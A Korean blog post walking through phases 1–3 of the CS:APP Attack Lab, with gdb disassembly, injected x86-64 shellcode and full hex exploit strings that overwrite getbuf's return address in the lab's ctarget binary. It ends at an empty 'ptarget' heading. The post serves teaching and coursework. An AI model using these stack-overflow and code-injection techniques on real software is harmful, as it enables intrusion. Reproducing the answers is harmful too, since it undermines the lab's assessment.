---
layout: post
title: "CS:APP Lab 3 Attack Lab"
date: Mon Jan 24 12:28:28 JST 2022
categories: CSAPP
tag:
toc: true
---

## Introduction

-   buffer overflows
-   3.10.3, 3.10.4

## Target Programs

ctarget, rtarget 파일은 문자열을 읽는다.
이때 getbuf 함수를 사용하는데 아래와 같다.

```
unsigned getbuf ()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

여기서 Gets는 gets와 비슷한 함수로 문자열을 읽고 buf에 저장한다.
buf를 보면 앞서 BUFFER_SIZE 크기로 선언되어 있다.
BUFFER_SIZE는 컴파일 단계에서 정해진 상수값으로 각 파일마다 정해져 있다.
Gets는 buf의 크기가 충분한지 확인하지 않는다.
입력값이 충분히 짧다면 아무런 문제 없이 1이 반환된다.
하지만 입력값이 너무 길다면 에러가 발생한다.

ctarget은 phase 1~3를 풀기 위해 사용하는데, Code Injection을 테스트한다.
rtarget은 phase 4~5가 들어 있고, Return-oriented programming을 테스트한다.
과제는 ctarget과 rtarget에 입력값 exploit strings를 전달해서 목적을 달성하는 것이다.
아래는 커맨드 라인에서 사용할 수 있는 옵션이다.

-   h: Print list of possible command line arguments
-   q: Don’t send results to the grading server
-   i FILE: Supply input from a file, rather than from standard input

과제를 해결하려면 exploit strings는 아스키 코드에 대응되지 않는 값이 들어가야 한다.
이때 HEX2RAW를 사용하면 되는데, 사용방법은 후술하겠다.

exploit string을 만들 때 중요한 점이 2가지 있다.

-   0x0a를 포함하면 안 된다. 해당 문자에 대응되는 아스키 코드가 '\n'이기 때문인데, 저 문자를 만나면 string의 끝으로 인식해서 원하는대로 작동하지 않을 수 있다.
-   HEX2RAW는 16진법으로 두 글자씩 띄워쓰도록 요구한다. 이때 little-endian 방식을 따르므로 0xdeadbeef를 만들고 싶다면 "ef be ad de"로 입력해야 한다. 특히 0을 만들고 싶다면 "00"을 사용해야 한다.

## HEX2RAW

HEX2RAW는 16진법으로 적힌 문자열을 가지고 아스키 코드를 출력한다.
이때 각 글자는 2개의 16진법 수로 표현되고 사이에 빈칸으로 구분한다.
예를 들어서 "30 31 32 33 34 35"를 HEX2RAW로 변환하면 "012345"가 나온다.

exploit.txt에 16진법 문자열이 있다고 할때 HEX2RAW로 변환하려면 아래처럼 하면 된다.
` ./hex2raw < exploit.txt > exploit-raw.txt`
이렇게 하면 exploit-raw.txt에 변환 내용이 적힌다.
이를 ctarget에 사용하려면 `./ctarget < exploit-raw.txt`를 입력하면 된다.

## ctarget(Code Injection)

### phase 1

ctarget은 내부적으로 test()를 호출하는데, 그 안에서 getbuf 함수를 사용한다.

```
void test ()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

여기서 우리는 getbuf()가 종료되었을 때 아래의 touch1이 실행되도록 하려고 한다.

```
void touch1()
{
    vlevel = 1;                                 /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

다시 말해 getbuf의 리턴이 test로 권한을 돌려주는 것이 아니라 touch1으로 전달되도록 하고 싶다.
그러기 위해선 return address의 값을 touch1의 주소로 바꿔줘야 한다.

우리가 해야할 일은 exploit string이 return address를 침범하도록 하는 것이다.
이는 BUFFER_SIZE의 크기를 알아야 하고, touch1의 주소를 알아야 가능한 것이다.
우선 BUFFER_SIZE를 알기 위해 getbuf를 디스어셈블해보자.

```
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
```

보면 스택에 0x28 만큼의 공간을 할당하고 있다.
이는 곧 40bytes의 공간을 만든다는 의미다.
각 char이 1byte를 차지하므로 BUFFER_SIZE는 40이다.

다음으로 touch1의 주소를 알아보자.

```
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
```

코드의 시작 주소가 0x4017c0인 것을 알 수 있다.
그러므로 exploit string은 앞에 40개의 문자를 넣고 뒤에 0x4017c0를 넣어줘야 한다.
phase1.txt에 아래 내용을 적어준다.

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

이 파일을 `./hex2raw < phase1.txt > phase1-ans.txt`로 변환해준다.
그리고 `./ctarget < phase1-ans.txt`로 값을 넣어주면 해결된다.

```
cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for Phase1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
```

### phase 2

#### What is task?

ctarget은 아래의 touch2 함수를 포함하고 있다.

```
void touch2(unsigned val)
{
    vlevel = 2;             /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

앞서 살펴봤듯이 ctarget은 test 함수를 호출한다.
그리고 test는 getbuf를 실행시킨다.
과제는 getbuf가 끝났을 때 test로 돌아가는 대신에 touch2를 실행시키는 것이다.
이때 touch2의 변수 val에 "cookie"를 넣어서 성공한 경우를 출력해야 한다.
이는 다시 말해서 Injection Attack을 실행해서 본래 코드와 다른 코드를 실행시키라는 뜻이다.

#### Code Injection Attacks

Injection Attack의 원리를 설명하기 위해 아래와 같은 두 함수 P와 Q가 있다고 하자.

```
void P() {
    Q();
    ...     // If Q is finished, the program returns here.
}

int Q() {
    char buf[64];
    gets(buf);
    ...
    return ...;
}
```

P는 Q를 호출하고, Q가 종료되면 다시 다음줄부터 코드를 실행한다.
그런데 앞서 했듯이 Q에서 stack overflow를 일으키면 return address를 바꿀 수 있다.
그리고 return address로 삽입한 코드의 위치를 지정해주면 해당 코드가 실행되는 것이다.

그렇다면 코드는 어디다 삽입해야 할까?
이는 굉장히 간단한데 스택에 코드를 삽입하면 된다.
Q는 gets로 문자열을 받아들이고 스택에 저장한다.
이때 스택에 exploit code를 저장하고, return address가 exploit code의 첫 줄의 주소를 가리키면 된다.
여기서 주소는 복잡할 것 없다.
exploit code를 스택의 탑부터 넣으면, return address를 스택의 탑으로 쓰면 된다.
이 내용을 요약하면 아래와 같다.

1. exploit code를 기계어로 바꾼다.
2. gets로 exploit code를 스택에 저장한다.
3. 이때 overflow를 일으켜서 return address를 스택의 탑으로 정한다.
4. exploit code가 실행된다.

#### Generating Byte Codes

위에서 exploit code를 기계어로 바꿔줘야 한다고 했다.
이는 어셈블리 코드를 16진법으로 바꿔야 한다는 뜻이다.
이는 gcc를 사용해서 가능하다.
예를 들어 아래와 같은 어셈블리 코드 파일 example.s가 있다고 하자.

```
// example.s
pushq   $0xabcdef
addq    $17,%rax
movl    %eax,%edx
```

위 코드를 기계어로 바꾸려면 `gcc -c example.s`를 실행하면 된다.
그러면 example.o 파일에 생성된다.
`objdump -d example.o`로 안에 보면 아래의 내용이 들어간다.

```
0000000000000000 <.text>:
   0: 68 ef cd ab 00            pushq  $0xabcdef
   5: 48 83 c0 11               add    $0x11,%rax
   9: 89 c2                     mov    %eax,%edx
```

위를 보면 알 수 있듯이 example.s의 코드는 아래와 같다.

```
68 ef cd ab 00 48 83 c0 11 89 c2
```

이처럼 만들어진 코드를 가지고, 앞서 phase1.txt 같은 파일을 만들어주면 된다.

#### solve

어셈블리 코드를 기계어로 변환시키는 방법을 알았으므로 코드를 작성해야 한다.
지금부터 만들 코드는 val에 cookie를 넣어주고, touch2로 리턴해줘야 한다.
val이 첫 번째 변수이므로 이는 곧 %rdi에 cookie를 넣어주는 것과 같다.
이때 cookie는 cookie.txt 파일에 주소가 적혀있다.
cookie.txt 파일을 보면 "0x59b997fa"가 들어있다.

다음으로 touch2의 주소를 알기 위해 `disas touch2`를 실행하면 아래처럼 나온다.

```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:    jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:    mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:    mov    $0x1,%edi
   0x000000000040180e <+34>:    mov    $0x0,%eax
   0x0000000000401813 <+39>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:    mov    $0x2,%edi
   0x000000000040181d <+49>:    callq  0x401c8d <validate>
   0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:    mov    $0x403110,%esi
   0x0000000000401829 <+61>:    mov    $0x1,%edi
   0x000000000040182e <+66>:    mov    $0x0,%eax
   0x0000000000401833 <+71>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:    mov    $0x2,%edi
   0x000000000040183d <+81>:    callq  0x401d4f <fail>
   0x0000000000401842 <+86>:    mov    $0x0,%edi
   0x0000000000401847 <+91>:    callq  0x400e40 <exit@plt>
```

여기서 우리는 touch2의 주소가 0x4017ec라는 것을 알 수 있다.
이제 phase2.s 파일에 어셈블리 코드를 만들자.

```
// phase2.s
movq    $0x59b997fa, %rdi
pushq   0x4017ec
ret
```

위 코드를 목적 코드로 바꾸기 위해 `gcc -c phase2.s`를 입력한다.
그리고 `objdump -d phase2.o`를 입력해 안의 내용을 확인한다.

```
csapp@a859b73afac0:~/project/attack$ objdump -d phase2.o

phase2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```

이제 return address에 %rsp의 값을 넣어줘야 한다.
getbuf의 <+4>에 `b *0x4017ac`로 break를 걸어준 다음 프로그램을 실행하자.
그리고 rsp의 내용을 확인해보면 0x5561dc78이 들어 있다.
40bytes 안에 exploit code를 넣어야 하고, 그 다음에 return address를 넣어야 한다.
이때 return address를 little-endian으로 넣는 것을 잊지 말자.
위 내용대로 phase2.txt에 내용을 작성하면 아래처럼 된다.

```
// phase2.txt
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

그리고 아래를 순서대로 실행시켜 답을 확인하면 된다.

`./hex2raw < phase2.txt > phase2-ans.txt`
`./ctarget < phase2-and.txt`

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for Phase2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

### phase 3

ctarget에는 아래와 같은 두 함수가 있다.

```
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3;       /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

앞서 했듯이 test로 돌아가지 않고 touch3를 실행하도록 해야 한다.
touch3의 변수 sval에 cookie를 전달해줘야 한다.
그런데 sval이 string이므로 cookie를 전달할때 0x를 빼고 8자리를 문자열로 바꿔서 전달해야 한다.
sval이 첫 번째 변수이므로 이 값은 %rdi에 전달해야 하고, string은 끝에 0으로 끝난다는 것을 기억하자.

우선 cookie를 string으로 바꿔주자.
59b997fa를 아스키 코드로 바꾸면 "35 39 62 39 39 37 66 61 00"이 된다.
여기서 마지막에 00이 있는 것은 문자열의 끝임을 표시하기 위해서다.
그런데 문제를 보면 hexmatch와 srtncmp를 실행했을 때, getbuf의 스택 범위를 덮어쓸 수 있다고 한다.
만약 앞서 했듯이 getbuf의 스택에 cookie를 넣어준다면, stack overflow 때문에 cookie 값이 변경될 수 있다.
이를 해결하는 방법은 2가지 정도가 있다.
첫 번째는 exploit code에서 추가로 스택 공간을 할당하는 것이다.
예를 들어서 0x50 정도를 할당하고 cookie를 넣어주면 stack overflow로 값이 변경될 걱정은 없다.
두 번째 방법은 getbuf 보다 상위 함수인 test의 스택에 넣어주는 것이다.
이 중에서 나는 2번째 방법을 선택했다.
이는 test가 스택 공간을 할당하고 getbuf를 바로 호출하기 때문에 스택에 빈 공간이 생겨서 값을 넣기 쉽고, 스택 주소가 근접해서 cookie 값을 넣기 쉽기 때문이다.

이제 test 스택의 주소를 알아보자.
0x40196c에서의 %rsp를 알아보면 되므로, `b *0x40196c`로 브레이크를 걸고 실행 시킨다.
그리고 `p $rsp`로 값을 보면, %rsp가 0x5561dca8인 것을 알 수 있다.
이제 기계어를 만드는 부분은 phase2와 동일하다.
%rdi에 0x5561dca8을 넣고, touch3의 주소(0x4018fa)를 스택에 추가하고 리턴해주면 된다.

```
// phase3.s
movq    $0x5561dca8, %rdi
pushq   $0x4018fa
ret
```

그리고 아래 코드로 기계어로 바꿔주고 확인하자.

`gcc -c phase3.s`
`objdump -d phase3.o`

```
csapp@a859b73afac0:~/project/attack$ objdump -d phase3.o

phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```

이제 위 코드를 가지고 입력할 값을 만들면 되는데, return address는 이전에 구했던 것을 그대로 사용하면 된다.
그리고 그 아래는 test의 스택에 cookie 문자열을 저장하는데 사용했다.

```
// phase3.txt
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00
```

여기서 고민이 됐던 것이 마지막에 00을 추가하는 것이었다.
만약 00을 추가하지 않는다면 문자열의 끝부분을 표시할 수 없다.
그렇다고 00을 추가하자니 test의 return address를 침범하는 문제가 있을 것 같았다.
그런데 00이 있든 없든 그대로 실행된다.
아마 이는 주소가 8bytes 중 3bytes만 사용하고 나머지가 0이기 때문에 가능한 것 같다.
그래서 00이 있든지 없든지 어차피 해당 부분이 00이라서 아무런 문제가 없다.

정답 파일을 만들었으니 아래 코드를 실행해서 답을 확인하면 된다.

`./hex2raw < phase3.txt > phase3-ans.txt`
`./ctarget < phase3-ans.txt`

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for Phase3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

## ptarget
